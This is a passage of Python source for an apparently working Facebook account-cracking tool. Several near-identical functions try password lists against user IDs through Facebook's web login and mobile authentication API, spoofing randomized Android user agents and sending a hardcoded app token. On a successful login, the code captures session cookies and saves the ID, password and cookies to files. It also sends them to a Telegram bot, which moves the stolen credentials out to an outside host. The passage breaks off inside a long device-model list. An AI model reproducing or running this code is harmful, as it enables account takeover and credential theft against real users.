    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    HEAD = HEADERSM1
    URSS = URLM1
    DATS = DATAM1
    try:
        for pas in pwv:
            free_fb = session.get('https://free.facebook.com').text
            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            update={
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m5(ids,pwv):
    global loop,oks,cps
    sm_mdl=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua = ua_valid()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':uaD2,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://b-g'+'raph.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass



def m6(ids,pwv):
    global loop,oks,cps    
    sm_mdl=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua = ua_valid()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':uaD2,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://b-a'+'pi.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass


def m7(ids,pwv):
    global loop,oks,cps
    sm_mdl=('GTH896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N